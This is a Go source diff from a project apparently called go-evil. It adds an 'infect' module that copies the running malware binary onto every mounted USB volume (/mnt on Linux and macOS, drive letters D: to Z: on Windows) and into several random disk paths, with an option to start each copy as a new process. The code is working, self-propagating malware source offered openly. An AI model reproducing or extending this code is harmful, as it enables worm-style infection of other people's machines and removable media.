+++ domains/infect/infect.go
@@ -1,73 +1,93 @@
 package infect
 
 import (
-	"regexp"
+	"fmt"
+	"io"
+	"os"
+	"runtime"
 
-	mal "github.com/s9rA16Bf4/go-evil/domains/malware/private"
+	"github.com/s9rA16Bf4/go-evil/domains/malware"
+	"github.com/s9rA16Bf4/go-evil/utility/algorithm/path"
+	"github.com/s9rA16Bf4/go-evil/utility/contains"
+	iio "github.com/s9rA16Bf4/go-evil/utility/io"
+	"github.com/s9rA16Bf4/go-evil/utility/json"
+	run_time "github.com/s9rA16Bf4/go-evil/utility/variables/runtime"
 	"github.com/s9rA16Bf4/notify_handler/go/notify"
 )
 
-const (
-	EXTRACT_SUBDOMAIN      = "(infect)\\.(.+)\\.(.+)\\(.*\\);" // Captures subdomain and function
-	EXTRACT_FUNCTION_VALUE = ".+\\(\"(.*)\"\\);"               // Grabs the value being passed to the function
-	EXTRACT_FUNCTION       = "(infect)\\.(.+)\\(.*\\);"        // This is for the cases when we don't have a subdomain
-)
+func Set_start_after_birth(base_64_serialize_json string) string {
+	data_structure := json.Receive(base_64_serialize_json)
+	data_structure.Append_to_call("infect.Set_start_after_birth()")
 
-func Parse(new_line string) {
-	regex := regexp.MustCompile(EXTRACT_FUNCTION_VALUE)
-	result := regex.FindAllStringSubmatch(new_line, -1)
-	var value string
-	if len(result) > 0 {
-		value = result[0][1]
-	} else {
-		value = "NULL"
-	}
-	regex = regexp.MustCompile(EXTRACT_SUBDOMAIN)
-	result = regex.FindAllStringSubmatch(new_line, -1)
+	data_structure.Start_malware_on_birth(true)
 
-	if len(result) > 0 { // There is a subdomain to extract
-		subdomain := result[0][2]
-		function := result[0][3]
-		switch subdomain {
-		case "disk":
-			switch function {
-			case "random":
-				mal.AddContent("infect.Disk_random()")
-			default:
-				function_error(function)
-			}
-		case "set":
-			switch function {
-			case "count":
-				mal.AddContent("infect.Set_infection_count(\"" + value + "\")")
-			case "start_after_birth":
-				mal.AddContent("infect.Set_start_after_birth()")
+	return json.Send(data_structure)
+}
 
-			default:
-				function_error(function)
-			}
-		default:
-			subdomain_error(subdomain)
+func USB(base_64_serialize_json string) string {
+	data_structure := json.Receive(base_64_serialize_json)
+	data_structure.Append_to_call("infect.USB()")
+
+	switch runtime.GOOS {
+	case "linux", "darwin":
+		usb_devices, err := os.ReadDir("/mnt")
+		if err != nil {
+			notify.Error(err.Error(), "infect.USB()")
+			//return
 		}
-	} else { // There might be a function which doesn't require a subdomain to work
-		regex = regexp.MustCompile(EXTRACT_FUNCTION)
-		result = regex.FindAllStringSubmatch(new_line, -1)
-		if len(result) > 0 {
-			function := result[0][2]
-			switch function {
-			case "usb":
-				mal.AddContent("infect.USB()")
-			case "disk":
-				mal.AddContent("infect.Disk(\"" + value + "\")")
-			default:
-				function_error(function)
-			}
+		for _, line := range usb_devices {
+			data_structure = json.Receive(Disk(line.Name(), json.Send(data_structure)))
+		}
+	case "windows":
+		driver_names := []string{"D:\\", "E:\\", "F:\\", "G:\\", "H:\\", "I:\\", "J:\\", "K:\\", "L:\\", "M:\\", "N:\\", "O:\\", "P:\\", "Q:\\", "R:\\", "S:\\", "T:\\", "U:\\", "V:\\", "W:\\", "X:\\", "Y:\\", "Z:\\"}
+		for _, drive := range driver_names {
+			data_structure = json.Receive(Disk(drive, json.Send(data_structure)))
 		}
 	}
+	return json.Send(data_structure)
 }
-func subdomain_error(subdomain string) {
-	notify.Error("Unknown subdomain '"+subdomain+"'", "infect.Parse()")
+
+func Disk(location string, base_64_serialize_json string) string {
+	data_structure := json.Receive(base_64_serialize_json)
+	data_structure.Append_to_call("infect.Disk()")
+
+	location = run_time.Check_if_variable(location)
+
+	in, err := os.Open(malware.Get_malware_location() + data_structure.Get_binary_name()) // Opens the running malware
+	if err != nil {
+		in.Close()
+		notify.Error(err.Error(), "infect.Disk()")
+		//return
+	}
+	if !contains.EndsWith(location, []string{"/"}) {
+		location += "/"
+	}
+	dst, err := os.Create(location + data_structure.Get_binary_name()) // Creates our target
+	if err != nil {
+		//return
+	}
+	_, err = io.Copy(dst, in)
+	if err != nil {
+		notify.Error(err.Error(), "infect.Disk()")
+		//return
+	}
+	if data_structure.Get_status_start_malware_on_birth() { // Start the newly created malware
+		go iio.Run_file(fmt.Sprintf("%s%s", location, data_structure.Get_binary_name())) // Spawns a new process
+	}
+
+	return json.Send(data_structure)
 }
-func function_error(function string) {
-	notify.Error("Unknown function '"+function+"'", "infect.Parse()")
+func Disk_random(base_64_serialize_json string) string {
+	data_structure := json.Receive(base_64_serialize_json)
+	data_structure.Append_to_call("infect.Disk_random()")
+
+	if data_structure.Get_infect_count() == 0 { // If nothing has been set
+		data_structure.Set_infect_count(5)
+	}
+
+	for i := 0; i < data_structure.Get_infect_count(); i++ {
+		data_structure = json.Receive(Disk(path.Generate_random_path(3), json.Send(data_structure)))
+	}
+
+	return json.Send(data_structure)
 }
